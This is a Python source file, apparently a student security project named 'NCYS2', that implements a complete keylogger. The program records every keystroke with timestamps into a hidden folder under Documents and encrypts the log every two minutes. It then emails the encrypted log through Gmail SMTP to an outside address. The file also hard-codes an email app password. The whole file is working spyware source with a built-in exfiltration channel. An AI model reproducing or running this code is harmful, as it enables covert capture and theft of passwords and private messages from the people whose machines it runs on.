from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import os
import smtplib
import ssl
import threading
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# === Configuration ===
FOLDER_NAME = os.path.expanduser("~/Documents/.ncys2_project")
KEY_FILE = os.path.join(FOLDER_NAME, "key.key")
LOG_FILE = os.path.join(FOLDER_NAME, "NCYS2_log.txt")
EMAIL_SENDER = "k224794@nu.edu.pk"
EMAIL_PASSWORD = "stmn vvqr nnyi ocid"
EMAIL_RECEIVER = "k224714@nu.edu.pk"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465
AUTO_ENCRYPT_INTERVAL = 120  # 2 minutes

# === Setup Folder ===
def setup_folder():
    if not os.path.exists(FOLDER_NAME):
        os.makedirs(FOLDER_NAME)

# === AES Key Handling ===
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    if not os.path.exists(KEY_FILE):
        return generate_key()
    with open(KEY_FILE, "rb") as key_file:
        return key_file.read()

# === In-Memory Keystroke Buffer ===
keystroke_buffer = []

# === Logging Keystrokes with Timestamps ===
def log_keystroke(key):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if hasattr(key, 'char') and key.char is not None:
            entry = f"[{now}] {key.char}\n"
        else:
            entry = f"[{now}] [{key.name.upper()}]\n"
    except AttributeError:
        entry = f"[{now}] [{str(key)}]\n"

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(entry)

    keystroke_buffer.append(entry)

# === Flush in-memory keystrokes to log file ===
def flush_buffer_to_log():
    if keystroke_buffer:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.writelines(keystroke_buffer)
        keystroke_buffer.clear()

# === Encrypt and Archive Log ===
def encrypt_log():
    flush_buffer_to_log()
    if not os.path.exists(LOG_FILE):
        return

    key = load_key()
    fernet = Fernet(key)

    with open(LOG_FILE, "rb") as original_file:
        original = original_file.read()

    if not original.strip():
        return

    # Unique encrypted filename based on timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    enc_filename = f"NCYS2_log_{timestamp}.encrypted"
    enc_path = os.path.join(FOLDER_NAME, enc_filename)

    encrypted = fernet.encrypt(original)

    with open(enc_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted)

    send_email_with_log(enc_path, enc_filename)

# === Email Sending ===
def send_email_with_log(enc_path, enc_filename):
    msg = MIMEMultipart()
    msg["From"] = EMAIL_SENDER
    msg["To"] = EMAIL_RECEIVER
    msg["Subject"] = f"NCYS2: Encrypted Keylog ({enc_filename})"

    try:
        with open(enc_path, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={enc_filename}")
        msg.attach(part)

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, context=context) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())

        print(f"[✓] Log sent: {enc_filename}")

    except Exception as e:
        print(f"[!] Failed to send email: {e}")

# === Background Thread ===
def auto_encrypt_loop():
    while True:
        time.sleep(AUTO_ENCRYPT_INTERVAL)
        encrypt_log()

# === Listener Callback ===
def on_press(key):
    log_keystroke(key)

# === Main ===
def main():
    setup_folder()
    load_key()

    threading.Thread(target=auto_encrypt_loop, daemon=True).start()

    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            encrypt_log()

if __name__ == "__main__":
    main()
